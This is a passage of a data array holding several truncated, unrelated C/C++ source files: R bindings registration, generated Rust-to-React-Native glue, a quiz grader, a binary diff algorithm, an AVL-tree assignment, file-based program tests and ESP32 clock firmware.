&_ConfigINI_scan_ini_file, 1},\n    {\"_ConfigINI_process_profile_name\", (DL_FUNC) &_ConfigINI_process_profile_name, 1},\n    {\"_ConfigINI_write_ini\", (DL_FUNC) &_ConfigINI_write_ini, 2},\n    {NULL, NULL, 0}\n};\n\nRcppExport void R_init_ConfigINI(DllInfo *dll) {\n    R_registerRoutines(dll, NULL, CallEntries, NULL, NULL);\n    R_useDynamicSymbols(dll, FALSE);\n}\n",
    "// This file was autogenerated by some hot garbage in the\n// `uniffi-bindgen-react-native` crate. Trust me, you don't want to mess with\n// it!\n#include \"lni.hpp\"\n\n#include \"UniffiJsiTypes.h\"\n#include <iostream>\n#include <map>\n#include <stdexcept>\n#include <thread>\n#include <utility>\n\nnamespace react = facebook::react;\nnamespace jsi = facebook::jsi;\n\n// Calling into Rust.\nextern \"C\" {\ntypedef void (*UniffiRustFutureContinuationCallback)(uint64_t data,\n                                                     int8_t poll_result);\ntypedef void (*UniffiForeignFutureFree)(uint64_t handle);\ntypedef void (*UniffiCallbackInterfaceFree)(uint64_t handle);\ntypedef struct UniffiForeignFuture {\n  uint64_t handle;\n  UniffiForeignFutureFree free;\n} UniffiForeignFuture;\ntypedef struct UniffiForeignFutureStructU8 {\n  uint8_t return_value;\n  RustCallStatus call_status;\n} UniffiForeignFutureStructU8;\ntypedef void (*UniffiForeignFutureCompleteU8)(\n    uint64_t callback_data, UniffiForeignFutureStructU8 result);\ntypedef struct UniffiForeignFutureStructI8 {\n  int8_t return_value;\n  RustCallStatus call_status;\n} UniffiForeignFutureStructI8;\ntypedef void (*UniffiForeignFutureCompleteI8)(\n    uint64_t callback_data, UniffiForeignFutureStructI8 result);\ntypedef struct UniffiForeignFutureStructU16 {\n  uint16_t return_value;\n  RustCallStatus call_status;\n} UniffiForeignFutureStructU16;\ntypedef void (*UniffiForeignFutureCompleteU16)(\n    uint64_t callback_data, UniffiForeignFutureStructU16 result);\ntypedef struct UniffiForeignFutureStructI16 {\n  int16_t return_value;\n  RustCallStatus call_status;\n} UniffiForeignFutureStructI16;\ntypedef void (*UniffiForeignFutureCompleteI16)(\n    uint64_t callback_data, UniffiForeignFutureStructI16 result);\ntypedef struct UniffiForeignFutureStructU32 {\n  uint32_t return_value;\n  RustCallStatus call_status;\n} UniffiForeignFutureStructU32;\ntypedef void (*UniffiForeignFutureCompleteU32)(\n    uint64_t callback_data, UniffiForeignFutureStructU32 result);\ntypedef struct UniffiForeignFutureStructI32 {\n  int32_t return_value;\n  RustCallStatus call_status;\n} UniffiForeignFutureStructI32;\ntypedef void (*UniffiForeignFutureCompleteI32)(\n    uint64_t callback_data, UniffiForeignFutureStructI32 result);\ntypedef struct UniffiForeignFutureStructU64 {\n  uint64_t return_value;\n  RustCallStatus call_status;\n} UniffiForeignFutureStructU64;\ntypedef void (*UniffiForeignFutureCompleteU64)(\n    uint64_t callback_data, UniffiForeignFutureStructU64 result);\ntypedef struct UniffiForeignFutureStructI64 {\n  int64_t return_value;\n  RustCallStatus call_status;\n} UniffiForeignFutureStructI64;\ntypedef void (*UniffiForeignFutureCompleteI64)(\n    uint64_t callback_data, UniffiForeignFutureStructI64 result);\ntypedef struct UniffiForeignFutureStructF32 {\n  float return_value;\n  RustCallStatus call_status;\n} UniffiForeignFutureStructF32;\ntypedef void (*UniffiForeignFutureCompleteF32)(\n    uint64_t callback_data, UniffiForeignFutureStructF32 result);\ntypedef struct UniffiForeignFutureStructF64 {\n  double return_value;\n  RustCallStatus call_status;\n} UniffiForeignFutureStructF64;\ntypedef void (*UniffiForeignFutureCompleteF64)(\n    uint64_t callback_data, UniffiForeignFutureStructF64 result);\ntypedef struct UniffiForeignFutureStructPointer {\n  void *return_value;\n  RustCallStatus call_status;\n} UniffiForeignFutureStructPointer;\ntypedef void (*UniffiForeignFutureCompletePointer)(\n    uint64_t callback_data, UniffiForeignFutureStructPointer result);\ntypedef struct UniffiForeignFutureStructRustBuffer {\n  RustBuffer return_value;\n  RustCallStatus call_status;\n} UniffiForeignFutureStructRustBuffer;\ntypedef void (*UniffiForeignFutureCompleteRustBuffer)(\n    uint64_t callback_data, UniffiForeignFutureStructRustBuffer result);\ntypedef struct UniffiForeignFutureStructVoid {\n  RustCallStatus call_status;\n} UniffiForeignFutureStructVoid;\ntypedef void (*UniffiForeignFutureCompleteVoid)(\n    uint64_t callback_data, UniffiForeignFutureStructVoid result);\nvoid *uniffi_lni_uniffi_fn_clone_db(void *ptr, RustCallStatus *uniffi_out_err);\nvoid uniffi_lni_uniffi_fn_free_db(void *ptr, RustCallStatus *uniffi_out_err);\nvoid *uniffi_lni_uniffi_fn_constructor_db_new(RustBuffer path,\n                                              RustCallStatus *uniffi_out_err);\nRustBuffer\nuniffi_lni_uniffi_fn_method_db_lookup_payment(void *ptr, RustBuffer payment_id,\n                                              RustCallStatus *uniffi_out_err);\nvoid uniffi_lni_uniffi_fn_method_db_save(void *ptr,\n                                         RustCallStatus *uniffi_out_err);\nvoid uniffi_lni_uniffi_fn_method_db_write_payment(\n    void *ptr, RustBuffer payment, RustCallStatus *uniffi_out_err);\nvoid *uniffi_lni_uniffi_fn_clone_phoenixdnode(void *ptr,\n                                              RustCallStatus *uniffi_out_err);\nvoid uniffi_lni_uniffi_fn_free_phoenixdnode(void *ptr,\n                                            RustCallStatus *uniffi_out_err);\nvoid *uniffi_lni_uniffi_fn_constructor_phoe",
    "#include <iostream>\n#include <string>\n#include <algorithm>\n#include<iomanip>\nusing namespace std;\n\nint main() {\n      restart:\n\n    cout << \"********************************\" << endl;\n    cout << \"         TEST MARKER            \" << endl;\n    cout << \"********************************\" << endl;\n\n    int num_students, choice, functionality;\n    char students_grade, again;\n    float percentage;\n    // Loop to ensure valid input for number of students\n    \n    cout << \"\\nEnter the number of students: \";\n    cin >> num_students;\n    if (cin.fail()|| num_students <= 0){\n        cout << \"Invalid input,Please restart the program and enter a positive number.\";\n        cin.clear();\n    }else{\n    // Array of correct answers for comparison\n    string correct_answers[20] = {\"TRUE\", \"TRUE\", \"FALSE\", \"TRUE\", \"FALSE\",\n                                  \"A\", \"B\", \"C\", \"D\", \"A\",\n                                  \"B\", \"C\", \"D\", \"A\", \"B\",\n                                  \"VERB TO BE\", \"WILLIAM SHAKESPEARE\", \"VERB\", \"SPEAKING\", \"AMERICA\"};\n    \n    // Dynamic arrays to store student answers and scores\n    string** students = new string*[num_students];\n    int* total_scores = new int[num_students];\n    char* grades = new char[num_students];\n\n    for (int i = 0; i < num_students; ++i) {\n        students[i] = new string[21];\n    }\n    \n    // Input student IDs and their answers\n    for (int i = 0; i < num_students; i++) {\n        cout << \"Enter student ID: \";\n        cin >> students[i][0];\n        cin.ignore();\n        for (int j = 1; j <= 20; j++) {\n            cout << \"Enter answer for question \" << j << \": \";\n            getline(cin, students[i][j]);   \n            transform(students[i][j].begin(), students[i][j].end(), students[i][j].begin(), ::toupper);  // Convert each answer to uppercase\n        }\n    }\n\n    // Calculate total scores and grades\n    for (int i = 0; i < num_students; i++) {\n        int total_score = 0;\n        for (int j = 1; j <= 20; j++) {\n            if (students[i][j] == correct_answers[j-1]) {\n                total_score += 2; // Correct answer: +2 points\n            } else if (students[i][j].empty()) {\n                total_score += 0; // No answer: 0 points\n            } else {\n                total_score -= 1; // Incorrect answer: -1 point\n            }\n        }\n\n        total_scores[i] = total_score;\n        \n        // Convert total score to percentage and assign grades\n        percentage = total_score * 2.5;\n        if (percentage >= 90 && percentage <= 100) {\n            grades[i] = 'A';\n        } else if (percentage >= 80 && percentage < 90) {\n            grades[i] = 'B';\n        } else if (percentage >= 70 && percentage < 80) {\n            grades[i] = 'C';\n        } else if (percentage >= 60 && percentage < 70) {\n            grades[i] = 'D';\n        } else {\n            grades[i] = 'F';\n        }\n    }\n\n    cout << endl;\n    cout << left << setw(10) << \"ID\" \n         << setw(20) << \"Total score\" \n         << setw(10) << \"Grade\" \n         << endl;\n    cout << \"------------------------------------\" << endl;\n  \n  // Print student IDs, total scores, and grades in tabular form\n    for (int i = 0; i < num_students; i++) {\n        cout << left << setw(10) << students[i][0]\n             << setw(20) << total_scores[i]\n             << setw(10) << grades[i]\n             << endl;\n    }\n\n    // Bubble sort to rank students based on total scores\n    for (int i = 0; i < num_students - 1; ++i) {\n        for (int j = 0; j < num_students - i - 1; ++j) {\n            if (total_scores[j] < total_scores[j + 1]) { // Descending order\n                // Swap marks\n                int tempMarks = total_scores[j];\n                total_scores[j] = total_scores[j + 1];\n                total_scores[j + 1] = tempMarks;\n\n                // Swap student IDs\n                string* tempStudent = students[j];\n                students[j] = students[j + 1];\n                students[j + 1] = tempStudent;\n\n                // Swap grades\n                char tempGrade = grades[j];\n                grades[j] = grades[j + 1];\n                grades[j + 1] = tempGrade;\n            }\n        }\n    }\n\n    do {\n        // Switch cases for functionalities\n        cout << endl << \"~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\" << endl;\n        cout << \"Which functionality do you want: \" << endl;\n        cout << \"~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\" << endl;\n        cout << \"\\n1. See top 5 or top 10 students \" << \"\\n2. Search for a student \" << endl;\n        cout<<\"~~~~> \";\n        cin >> functionality; \n          \n\n        switch (functionality) {\n            case 1: {\n                // Display top students based on user choice\n                cout << \"Enter 5 or 10: \";\n                cin >> choice;\n\n                if (choice != 5 && choice != 10) {\n                    cout << \"Invalid choice. Please restart the program and enter either 5 or 10.\" << endl;\n                    return 1;\n                }\n\n                // Display top students\n            ",
    "//diff.cpp\n//\n/*\n The MIT License (MIT)\n Copyright (c) 2012-2018 HouSisong\n\n Permission is hereby granted, free of charge, to any person\n obtaining a copy of this software and associated documentation\n files (the \"Software\"), to deal in the Software without\n restriction, including without limitation the rights to use,\n copy, modify, merge, publish, distribute, sublicense, and/or sell\n copies of the Software, and to permit persons to whom the\n Software is furnished to do so, subject to the following\n conditions:\n\n The above copyright notice and this permission notice shall be\n included in all copies or substantial portions of the Software.\n\n THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND,\n EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES\n OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND\n NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT\n HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY,\n WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING\n FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR\n OTHER DEALINGS IN THE SOFTWARE.\n*/\n\n#include \"diff.h\"\n#include <string.h> //strlen memcmp\n#include <stdio.h>  //fprintf\n#include <algorithm> //std::max std::sort\n#include <vector>\n#include \"private_diff/suffix_string.h\"\n#include \"private_diff/bytes_rle.h\"\n#include \"private_diff/compress_detect.h\"\n#include \"private_diff/pack_uint.h\"\n#include \"private_diff/mem_buf.h\"\n#include \"../../hpatch-sys/HPatch/patch.h\"\n#include \"../../hpatch-sys/HPatch/patch_private.h\"\n#include \"private_diff/limit_mem_diff/covers.h\"\n#include \"private_diff/limit_mem_diff/digest_matcher.h\"\n#include \"private_diff/limit_mem_diff/stream_serialize.h\"\n#include \"../libParallel/parallel_import.h\"\n#if (_IS_USED_MULTITHREAD)\n#include <thread>   //if used vc++, need >= vc2012\n#include <atomic>\n#endif\nusing namespace hdiff_private;\n\nstatic const char* kHDiffVersionType  =\"HDIFF13\";\nstatic const char* kHDiffSFVersionType=\"HDIFFSF20\";\n\n#define checki(value,info) { if (!(value)) { throw std::runtime_error(info); } }\n#define check(value) checki(value,\"check \"#value\" error!\")\n\n#if (_SSTRING_FAST_MATCH>0)\nstatic const int kMinMatchLen   = (_SSTRING_FAST_MATCH>kCoverMinMatchLen)?_SSTRING_FAST_MATCH:kCoverMinMatchLen;\n#else\nstatic const int kMinMatchLen   = kCoverMinMatchLen; //\u6700\u5c0f\u641c\u5bfb\u76f8\u7b49\u957f\u5ea6\u3002\n#endif\nstatic const int kMinMatchScore = 2; //\u6700\u5c0f\u641c\u5bfb\u8986\u76d6\u6536\u76ca.\n\nnamespace{\n    \n    typedef unsigned char TByte;\n    typedef size_t        TUInt;\n    typedef ptrdiff_t     TInt;\n    static const int kMaxLinkSpaceLength=(1<<9)-1; //\u8de8\u8986\u76d6\u7ebf\u5408\u5e76\u65f6,\u5141\u8bb8\u5408\u5e76\u7684\u6700\u8fdc\u8ddd\u79bb.\n    \n    //\u8986\u76d6\u7ebf.\n    struct TOldCover {\n        TInt   oldPos;\n        TInt   newPos;\n        TInt   length;\n        inline TOldCover():oldPos(0),newPos(0),length(0) { }\n        inline TOldCover(TInt _oldPos,TInt _newPos,TInt _length)\n            :oldPos(_oldPos),newPos(_newPos),length(_length) { }\n        inline TOldCover(const TOldCover& cover)\n            :oldPos(cover.oldPos),newPos(cover.newPos),length(cover.length) { }\n        \n        inline bool isCanLink(const TOldCover& next)const{//\u8986\u76d6\u7ebf\u662f\u5426\u53ef\u4ee5\u8fde\u63a5.\n            return isCollinear(next)&&(linkSpaceLength(next)<=kMaxLinkSpaceLength);\n        }\n        inline bool isCollinear(const TOldCover& next)const{//\u8986\u76d6\u7ebf\u662f\u5426\u5728\u540c\u4e00\u6761\u76f4\u7ebf\u4e0a.\n            return cover_is_collinear(*this,next);\n        }\n        inline TInt linkSpaceLength(const TOldCover& next)const{//\u8986\u76d6\u7ebf\u95f4\u7684\u95f4\u8ddd.\n            return next.oldPos-(oldPos+length);\n        }\n        inline void Link(const TOldCover& next){//\u5171\u7ebf\u76842\u8986\u76d6\u7ebf\u5408\u5e76\u94fe\u63a5.\n            assert(isCollinear(next));\n            assert(oldPos<=next.oldPos);\n            length = (next.oldPos-oldPos)+next.length;\n        }\n    };\n\n\nstruct TDiffData{\n    const TByte*            newData;\n    const TByte*            newData_end;\n    const TByte*            oldData;\n    const TByte*            oldData_end;\n};\n\n\n//\u67e5\u627e\u76f8\u7b49\u7684\u5b57\u7b26\u4e32\u957f\u5ea6.\ntemplate<TInt kMaxEqLenLimit>\nstatic TInt getEqualLengthLimit(const TByte* x,const TByte* x_end,\n                          const TByte* y,const TByte* y_end){\n    const TInt xLen=(TInt)(x_end-x);\n    const TInt yLen=(TInt)(y_end-y);\n    TInt maxEqLen=(xLen<yLen)?xLen:yLen;\n    if (kMaxEqLenLimit)\n        maxEqLen=(maxEqLen<=kMaxEqLenLimit)?maxEqLen:kMaxEqLenLimit;\n    for (TInt i=0; i<maxEqLen; ++i) {\n        if (x[i]!=y[i])\n            return i;\n    }\n    return maxEqLen;\n}\n#define getEqualLength(x,x_end,y,y_end) getEqualLengthLimit<0>(x,x_end,y,y_end)\n\nstruct TDiffLimit{\n    IDiffSearchCoverListener* listener;\n    size_t      newPos;\n    size_t      newEnd;\n    size_t      recoverOldPos;\n    size_t      recoverOldEnd;\n    TCompressDetect& nocover_detect;\n    TCompressDetect& cover_detect;\n    TOldCover        lastCover_back;\n    int              kMaxMatchDeep;\n};\n\n \n//\u5f97\u5230\u6700\u957f\u7684\u4e00\u4e2a\u5339\u914d\u957f\u5ea6\u548c\u5176\u4f4d\u7f6e.\nstatic TInt getBestMatch(TInt* out_pos,const TSuffixString& sstring,\n                         const TByte* newData,const TByte* newData_end,\n                         TInt curNewPos,TDiffLimit* diffLimit=0,size_t* out_limitSkip=0){\n",
    "#ifndef __PROGTEST__\n#include <cassert>\n#include <cstdarg>\n#include <iomanip>\n#include <cstdint>\n#include <iostream>\n#include <memory>\n#include <limits>\n#include <optional>\n#include <array>\n#include <random>\n#include <type_traits>\n\n// We use std::vector as a reference to check our implementation.\n// It is not available in progtest :)\n#include <vector>\n\ntemplate < typename T >\nstruct Ref {\n    bool empty() const { return _data.empty(); }\n    size_t size() const { return _data.size(); }\n\n    const T& operator [] (size_t index) const { return _data.at(index); }\n    T& operator [] (size_t index) { return _data.at(index); }\n\n    void insert(size_t index, T value) {\n        if (index > _data.size()) throw std::out_of_range(\"oops\");\n        _data.insert(_data.begin() + index, std::move(value));\n    }\n\n    T erase(size_t index) {\n        T ret = std::move(_data.at(index));\n        _data.erase(_data.begin() + index);\n        return ret;\n    }\n\n    auto begin() const { return _data.begin(); }\n    auto end() const { return _data.end(); }\n\nprivate:\n    std::vector<T> _data;\n};\n\n#endif\n\nnamespace config {\n    inline constexpr bool PARENT_POINTERS = true;\n    inline constexpr bool CHECK_DEPTH = true;\n}\n\ntemplate < typename T>\nstruct Node {\n    T value;\n    Node<T>* parent;\n    Node<T>* left;\n    Node<T>* right;\n    int depth;\n    int size; // \u0420\u0430\u0437\u043c\u0435\u0440 \u043f\u043e\u0434\u0434\u0435\u0440\u0435\u0432\u0430\n\n    Node(const T& val) : value(val), parent(nullptr), left(nullptr), right(nullptr), depth(0), size(1) {}\n\n    static void updateDepthAndSize(Node<T>* node) {\n        if (node) {\n            int left_depth = node->left ? node->left->depth : -1;\n            int right_depth = node->right ? node->right->depth : -1;\n            node->depth = std::max(left_depth, right_depth) + 1;\n\n            int left_size = node->left ? node->left->size : 0;\n            int right_size = node->right ? node->right->size : 0;\n            node->size = 1 + left_size + right_size;\n        }\n    }\n\n    static Node<T>* findByIndex(Node<T>* node, size_t index) {\n        if (!node) return nullptr;\n        int leftSize = node->left ? node->left->size : 0;\n        if (index < (size_t)leftSize) {\n            return findByIndex(node->left, index);\n        } else if (index == (size_t)leftSize) {\n            return node;\n        } else {\n            return findByIndex(node->right, index - leftSize - 1);\n        }\n    }\n\n    static Node<T>* insertByIndex(Node<T>*& node, size_t index, T value, Node<T>* parent = nullptr) {\n        if (!node) {\n            node = new Node<T>(value);\n            node->parent = parent;\n            return node;\n        }\n\n        int leftSize = node->left ? node->left->size : 0;\n\n        if (index <= (size_t)leftSize) {\n            node->left = insertByIndex(node->left, index, value, node);\n        } else {\n            node->right = insertByIndex(node->right, index - leftSize - 1, value, node);\n        }\n\n        updateDepthAndSize(node);\n\n        // \u0411\u0430\u043b\u0430\u043d\u0441\u0438\u0440\u043e\u0432\u043a\u0430 \u0434\u0435\u0440\u0435\u0432\u0430\n        return balance(node);\n    }\n\n    static Node<T>* eraseByIndex(Node<T>*& node, size_t index) {\n        if (!node) return nullptr;\n\n        int leftSize = node->left ? node->left->size : 0;\n\n        if (index < (size_t)leftSize) {\n            node->left = eraseByIndex(node->left, index);\n            if (node->left) node->left->parent = node;\n        } else if (index == (size_t)leftSize) {\n            // \u0423\u0434\u0430\u043b\u044f\u0435\u043c \u0442\u0435\u043a\u0443\u0449\u0438\u0439 \u0443\u0437\u0435\u043b\n            if (!node->left || !node->right) {\n                Node<T>* temp = node->left ? node->left : node->right;\n                if (temp) temp->parent = node->parent;\n                delete node;\n                node = temp;\n            } else {\n                // \u0423\u0437\u0435\u043b \u0441 \u0434\u0432\u0443\u043c\u044f \u0434\u0435\u0442\u044c\u043c\u0438\n                Node<T>* successor = minValueNode(node->right);\n                node->value = successor->value;\n                node->right = eraseByIndex(node->right, 0);\n                if (node->right) node->right->parent = node;\n            }\n        } else {\n            node->right = eraseByIndex(node->right, index - leftSize - 1);\n            if (node->right) node->right->parent = node;\n        }\n\n        if (node) {\n            updateDepthAndSize(node);\n\n            // \u0411\u0430\u043b\u0430\u043d\u0441\u0438\u0440\u043e\u0432\u043a\u0430 \u0434\u0435\u0440\u0435\u0432\u0430\n            node = balance(node);\n        }\n\n        return node;\n    }\n\n    static Node<T>* minValueNode(Node<T>* node) {\n        Node<T>* current = node;\n        while (current && current->left != nullptr)\n            current = current->left;\n        return current;\n    }\n\n    static int getBalance(Node<T>* node) {\n        if (!node) return 0;\n        int left_depth = node->left ? node->left->depth : -1;\n        int right_depth = node->right ? node->right->depth : -1;\n        return right_depth - left_depth;\n    }\n\n    static Node<T>* balance(Node<T>* node) {\n        int balanceFactor = getBalance(node);\n\n        if (balanceFactor > 1) {\n            if (getBalance(node->right) >= 0) {\n                node = rotateLeft(node);\n            } else {\n                node->right = rotateRight(node->right);\n   ",
    "#include \"acutest.h\" // Acutest testing framework\n#include <iostream>\n#include <string>\n\nconst std::string EXE_NAME = \"./oop24\";\n\nvoid test_admin_insert(void) {\n    std::string filename = \"tests/admin_insert.txt\";\n\n    // Create a copy of the products so you don't mess with them\n    system(\"cp ./files/products.txt ./files/products_copy.txt\");\n\n    // Try inserting\n    std::string cmd = EXE_NAME + \" files/categories.txt files/products_copy.txt files/users.txt < \" + filename + \" > /dev/null 2>&1\";\n    if (system(cmd.c_str()) != 0) {\n        TEST_CHECK(false);\n        TEST_MSG(\"What failed: ./oop24 failed to execute\");\n    }\n\n    // Check if product was inserted\n    std::string search_string = \"Dummy Product @ Dummy Description @ Tech @ Laptop @ 500.00 @ Unit @ 1000\";\n    std::string grep_cmd = \"grep -q \\\"\" + search_string + \"\\\" ./files/products_copy.txt\";\n    if (system(grep_cmd.c_str()) != 0) {\n        TEST_CHECK(false);\n        TEST_MSG(\"What failed: Product was not inserted\");\n    }\n\n    // Delete copy\n    system(\"rm -f ./files/products_copy.txt\");\n}\n\nvoid test_admin_edit_title(void) {\n    std::string filename = \"tests/admin_edit_title.txt\";\n\n    // Create a copy of the products so you don't mess with them\n    system(\"cp ./files/products.txt ./files/products_copy.txt\");\n\n    // Try editing title\n    std::string cmd = EXE_NAME + \" files/categories.txt files/products_copy.txt files/users.txt < \" + filename + \" > /dev/null 2>&1\";\n    if (system(cmd.c_str()) != 0) {\n        TEST_CHECK(false);\n        TEST_MSG(\"What failed: ./oop24 failed to execute\");\n    }\n\n    // Check if product was edited\n    std::string search_string = \"Dummy Apple @ A healthy fruit @ Food @ Fruit @ 1.80 @ Kg @ 100\";\n    std::string grep_cmd = \"grep -q \\\"\" + search_string + \"\\\" ./files/products_copy.txt\";\n    if (system(grep_cmd.c_str()) != 0) {\n        TEST_CHECK(false);\n        TEST_MSG(\"What failed: Product was not edited\");\n    }\n\n    // Delete copy\n    system(\"rm -f ./files/products_copy.txt\");\n}\n\nvoid test_admin_edit_description(void) {\n    std::string filename = \"tests/admin_edit_description.txt\";\n\n    // Create a copy of the products so you don't mess with them\n    system(\"cp ./files/products.txt ./files/products_copy.txt\");\n\n    // Try editing description\n    std::string cmd = EXE_NAME + \" files/categories.txt files/products_copy.txt files/users.txt < \" + filename + \" > /dev/null 2>&1\";\n    if (system(cmd.c_str()) != 0) {\n        TEST_CHECK(false);\n        TEST_MSG(\"What failed: ./oop24 failed to execute\");\n    }\n\n    // Check if product was edited\n    std::string search_string = \"Apple @ A dummy healthy fruit @ Food @ Fruit @ 1.80 @ Kg @ 100\";\n    std::string grep_cmd = \"grep -q \\\"\" + search_string + \"\\\" ./files/products_copy.txt\";\n    if (system(grep_cmd.c_str()) != 0) {\n        TEST_CHECK(false);\n        TEST_MSG(\"What failed: Product was not edited\");\n    }\n\n    // Delete copy\n    system(\"rm -f ./files/products_copy.txt\");\n}\n\nvoid test_admin_edit_category_subcategory(void) {\n    std::string filename = \"tests/admin_edit_category_subcategory.txt\";\n\n    // Create a copy of the products so you don't mess with them\n    system(\"cp ./files/products.txt ./files/products_copy.txt\");\n\n    // Try editing category and subcategory\n    std::string cmd = EXE_NAME + \" files/categories.txt files/products_copy.txt files/users.txt < \" + filename + \" > /dev/null 2>&1\";\n    if (system(cmd.c_str()) != 0) {\n        TEST_CHECK(false);\n        TEST_MSG(\"What failed: ./oop24 failed to execute\");\n    }\n\n    // Check if product was edited\n    std::string search_string = \"Apple @ A healthy fruit @ Drink @ Tea @ 1.80 @ Kg @ 100\";\n    std::string grep_cmd = \"grep -q \\\"\" + search_string + \"\\\" ./files/products_copy.txt\";\n    if (system(grep_cmd.c_str()) != 0) {\n        TEST_CHECK(false);\n        TEST_MSG(\"What failed: Product was not edited\");\n    }\n\n    // Delete copy\n    system(\"rm -f ./files/products_copy.txt\");\n}\n\nvoid test_admin_edit_price(void) {\n    std::string filename = \"tests/admin_edit_price.txt\";\n\n    // Create a copy of the products so you don't mess with them\n    system(\"cp ./files/products.txt ./files/products_copy.txt\");\n\n    // Try editing price\n    std::string cmd = EXE_NAME + \" files/categories.txt files/products_copy.txt files/users.txt < \" + filename + \" > /dev/null 2>&1\";\n    if (system(cmd.c_str()) != 0) {\n        TEST_CHECK(false);\n        TEST_MSG(\"What failed: ./oop24 failed to execute\");\n    }\n\n    // Check if product was edited\n    std::string search_string = \"Apple @ A healthy fruit @ Food @ Fruit @ 99999.00 @ Kg @ 100\";\n    std::string grep_cmd = \"grep -q \\\"\" + search_string + \"\\\" ./files/products_copy.txt\";\n    if (system(grep_cmd.c_str()) != 0) {\n        TEST_CHECK(false);\n        TEST_MSG(\"What failed: Product was not edited\");\n    }\n\n    // Delete copy\n    system(\"rm -f ./files/products_copy.txt\");\n}\n\nvoid test_admin_edit_quantity(void) {\n    std::string filename = \"tests/admin_edit_quantity.txt\";\n\n    // Create a copy of th",
    "#include \"HollowClock.h\"\n#include \"MotorControl.h\"\n#include \"PreferencesManager.h\"\n#include \"SoundPlayer.h\"\n#include \"config.h\"\n#include \"esp_sntp.h\"\n#include <thread>\n#include <time.h>\n\n#if DEBUG_HOLLOW_CLOCK\n#define TRACE(...) Serial.printf(__VA_ARGS__)\n#define ERROR(...) Serial.printf(__VA_ARGS__)\n#else\n#define TRACE(...)\n#define ERROR(...)\n#endif\n\n#if USE_DEEP_SLEEP_WAKEUP_FOR_CLOCK\nRTC_DATA_ATTR uint32_t unresettable_var;\n#endif\n\nenum {\n  CMD_START = 1,          // start movement\n  CMD_STOP = 2,           // stop movement\n  CMD_STEP = 3,           // move steps\n  CMD_UPDATE_POSITION = 4 // set hands at specific position\n};\n\nHollowClock &HollowClock::getInstance() {\n  static HollowClock instance;\n  return instance;\n}\n\nvoid HollowClock::adjustClockPosition(int steps) {\n  // Adjust current position\n  if (clock_position != PreferencesManager::INVALID_CLOCK_POSITION) {\n    clock_position = (steps > 0)\n                         ? (clock_position + steps) % max_clock_position\n                         : (clock_position + max_clock_position + steps) %\n                               max_clock_position;\n  }\n}\n// 10:35 - 0:27\nint HollowClock::calculateTimeDiff(int local_clock_position, int current_time,\n                                   bool &direction_forward) {\n  int time_diff = 0;\n\n  direction_forward = true;\n  if (allow_backward_movement) {\n    if (local_clock_position > current_time) {\n      current_time += max_clock_position;\n    }\n    if ((current_time - local_clock_position) > max_clock_position / 2) {\n      direction_forward = false;\n      time_diff = abs(max_clock_position - current_time + local_clock_position);\n    } else {\n      time_diff = abs(current_time - local_clock_position);\n    }\n    TRACE(\"Time diff: %d %d (%d)-> time_diff: %s%d\\n\",\n          current_time - (direction_forward ? max_clock_position : 0) -\n              local_clock_position,\n          current_time - local_clock_position, max_clock_position / 2,\n          direction_forward ? \"\" : \"-\", time_diff);\n  } else {\n    time_diff = (current_time + max_clock_position - local_clock_position) %\n                max_clock_position;\n    TRACE(\"Time diff: %d %d\\n\", local_clock_position - current_time,\n          (current_time - local_clock_position + max_clock_position) %\n              max_clock_position);\n  }\n  return time_diff;\n}\n\nvoid HollowClock::playChime(int current_time) {\n  static int last_played_chime = -1;\n  uint32_t hours = current_time / (60 * steps_per_minute);\n  uint32_t minutes = current_time / steps_per_minute;\n  if (play_chime) {\n    // Play chime\n    if (last_played_chime != hours && (minutes % 60 == 0)) {\n      last_played_chime = hours;\n      SoundPlayer::getInstance().playChime();\n    }\n  }\n}\n\nvoid HollowClock::saveClockPosition(void) {\n  PreferencesManager &pm = PreferencesManager::getInstance();\n  pm.setClock(clock_position);\n}\n\nvoid HollowClock::setDirection(bool direction) { flip_rotation = direction; }\n\nvoid HollowClock::setAllowBackwardMovement(bool allow) {\n  allow_backward_movement = allow;\n}\n\nvoid HollowClock::threadFunction(void) {\n  bool clock_moving = true;\n  MotorControl &motor = MotorControl::getInstance();\n  while (true) {\n    struct tm timeinfo;\n\n    // Check for any new command\n    uint32_t value;\n    if (getFromQueue(value)) {\n      uint8_t command = getCommand(value);\n      TRACE(\"Command received: %d\\n\", command);\n      switch (command) {\n      case CMD_START:\n        clock_moving = true;\n        break;\n      case CMD_STOP:\n        clock_moving = false;\n        break;\n      case CMD_STEP:\n        int steps;\n        getParams(value, steps);\n        TRACE(\"CMD_STEP: %d\\n\", steps);\n        if (steps > 0) {\n          while (steps > 0) {\n            int step = (steps > MAX_FAST_MOVMENT_STEPS) ? MAX_FAST_MOVMENT_STEPS\n                                                        : steps;\n            motor.rotate(step, delay_time, flip_rotation);\n            adjustClockPosition(step);\n            steps -= step;\n            delay(10);\n          }\n        } else if (allow_backward_movement) {\n          while (steps < 0) {\n            int step = (steps < -MAX_FAST_MOVMENT_STEPS)\n                           ? -MAX_FAST_MOVMENT_STEPS\n                           : steps;\n            motor.rotate(step, delay_time, flip_rotation);\n            adjustClockPosition(step);\n            steps -= step;\n            delay(10);\n          }\n        }\n        break;\n      case CMD_UPDATE_POSITION:\n        uint8_t hours, minutes;\n        getParams(value, hours, minutes);\n        clock_position = (hours * 60 + minutes) * steps_per_minute;\n        saveClockPosition();\n        break;\n      }\n      continue;\n    }\n\n    if (clock_moving) {\n      if (!::getLocalTime(&timeinfo)) {\n        TRACE(\"Failed to obtain time\\n\");\n        delay(5000);\n        continue;\n      }\n\n      int hour = timeinfo.tm_hour % 12;\n      int minute = timeinfo.tm_min;\n      int current_time = (hour * 60 + minute) * steps_per_minute;\n\n      if (clock_position == PreferencesM",
